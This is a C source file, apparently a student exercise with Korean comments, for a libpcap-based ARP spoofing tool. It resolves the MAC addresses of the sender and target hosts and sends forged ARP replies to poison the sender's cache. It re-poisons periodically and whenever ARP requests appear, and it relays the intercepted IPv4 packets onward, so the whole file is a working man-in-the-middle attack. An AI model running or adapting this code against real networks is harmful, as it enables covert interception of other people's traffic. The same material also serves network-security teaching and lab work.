//main.c
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <pcap.h>
#include <string.h>
#include "hb_headers.h"
#include "arp_utils.h"

int main(int argc, const char* argv[]) {

    if (argc < 4 || (argc % 2) != 0) {
        usage();
        return EXIT_FAILURE;
    }

    const char* dev = argv[1];

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "couldn't open device %s (%s)\n", dev, errbuf);
        return EXIT_FAILURE;
    }

    hb_mac my_mac;
    if (!get_my_mac(dev, &my_mac)) {
        printf("Failed to get MAC address\n");
        pcap_close(pcap);
        return EXIT_FAILURE;
    }


    uint32_t my_ip;
    if (!get_my_ip(dev, &my_ip)) {
        printf("Failed to get IP address\n");
        pcap_close(pcap);
        return EXIT_FAILURE;
    }


    // flow 설정
    Flow* flow_head = NULL;

    for (int i = 2; i < argc; i += 2) {
        const char* sender_ip_str = argv[i];
        const char* target_ip_str = argv[i + 1];


        uint32_t sender_ip;
        if (!get_ip_from_string(sender_ip_str, &sender_ip)) {
            printf("Invalid sender IP: %s\n", sender_ip_str);
            free_flow_list(flow_head);
            pcap_close(pcap);
            return EXIT_FAILURE;
        }

        uint32_t target_ip;
        if (!get_ip_from_string(target_ip_str, &target_ip)) {
            printf("Invalid target IP: %s\n", target_ip_str);
            free_flow_list(flow_head);
            pcap_close(pcap);
            return EXIT_FAILURE;
        }

        hb_mac sender_mac;
        if (!get_other_mac(pcap, my_mac, my_ip, &sender_mac, sender_ip)) {
            printf("Failed to get sender MAC for %s\n", sender_ip_str);
            free_flow_list(flow_head);
            pcap_close(pcap);
            return EXIT_FAILURE;
        }
        hb_mac target_mac;
        if (!get_other_mac(pcap, my_mac, my_ip, &target_mac, target_ip)) {
            printf("Failed to get target MAC for %s\n", target_ip_str);
            free_flow_list(flow_head);
            pcap_close(pcap);
            return EXIT_FAILURE;
        }

        Flow* node = create_flow(sender_ip, sender_mac, target_ip, target_mac);
        if (node == NULL) {
            printf("Failed to create flow\n");
            free_flow_list(flow_head);
            pcap_close(pcap);
            return EXIT_FAILURE;
        }

        if (!append_flow(&flow_head, node)) {
            free(node);
            printf("Failed to append flow\n");
            free_flow_list(flow_head);
            pcap_close(pcap);
            return EXIT_FAILURE;
        }
    }

    // flow들에 각각 초기 감염
    Flow* cur = flow_head;
    while (cur != NULL) {
        if (!send_arp_infect_reply(pcap, cur->sender_mac, cur->sender_ip, my_mac, cur->target_ip)) {
            printf("initial infect failed\n");
        }
	else printf("initial infect\n");
        cur = cur->next;
    }


    struct pcap_pkthdr* header;
    const u_char* recv_packet;
    unsigned int infect_counter = 0;
    const unsigned int infect_every = 2000000;

    while(1){
        int res = pcap_next_ex(pcap, &header, &recv_packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) return EXIT_FAILURE;
        if (header->caplen < sizeof(hb_eth_hdr)) continue;

        infect_counter++;
        if (infect_counter >= infect_every) {
            Flow* cur = flow_head;

            while (cur != NULL) {
                if (!send_arp_infect_reply(pcap, cur->sender_mac, cur->sender_ip, my_mac, cur->target_ip)) printf("periodic infect failed\n");
                else printf("periodic infect\n");
                cur = cur->next;
                }
            infect_counter = 0;
        }   // 주기적 재감염


        const hb_eth_hdr* check = (const hb_eth_hdr*)recv_packet;
        switch (ntohs(check->ethertype)) {
            case ETHERTYPE_ARP: {
                const struct EthArpPacket* arp_packet = (const struct EthArpPacket*)recv_packet;
                FlowPacketType type;
                Flow* matched = find_flow_from_arp_request(flow_head, arp_packet, my_mac, &type);

                switch (type) {
                    case FLOW_PACKET_SENDER_BROADCAST_REQ:
                        printf("found sender broadcast request\n");
                        break;

                    case FLOW_PACKET_SENDER_UNICAST_REQ_TO_ME:
                        printf("found sender unicast request\n");
                        break;

                    case FLOW_PACKET_TARGET_BROADCAST_REQ:
                        printf("found target broadcast request\n");
                        break;

                    case FLOW_PACKET_NONE:
                    default:
                        break;
                }

                if (matched != NULL) {
                    if (!send_arp_infect_reply(pcap, matched->sender_mac, matched->sender_ip, my_mac, matched->target_ip)) printf("re-infect failed\n");
                    else printf("re-infect\n");
                }

                }break;
            
            

            case ETHERTYPE_IPV4: {
                const struct EthIpPacket* ip_packet = (const struct EthIpPacket*)recv_packet;
                Flow* ip_matched = find_flow_from_ip_packet(flow_head, ip_packet,my_ip);
                
                if (ip_matched != NULL) {
                    u_char* reply_packet = (u_char*)malloc(header->caplen);
                    memcpy(reply_packet, recv_packet, header->caplen);

                    hb_eth_hdr* eth = (hb_eth_hdr*)reply_packet;
                    eth->dst_mac = ip_matched->target_mac;
                    eth->src_mac = my_mac;
                
                    if (pcap_sendpacket(pcap, reply_packet, header->caplen) != 0) {
                        fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(pcap));
                        free(reply_packet);
                        free_flow_list(flow_head);
                        pcap_close(pcap);
                        return EXIT_FAILURE;
                    }
                    free(reply_packet);
                }
            }
            default: continue;
        }


    }
}
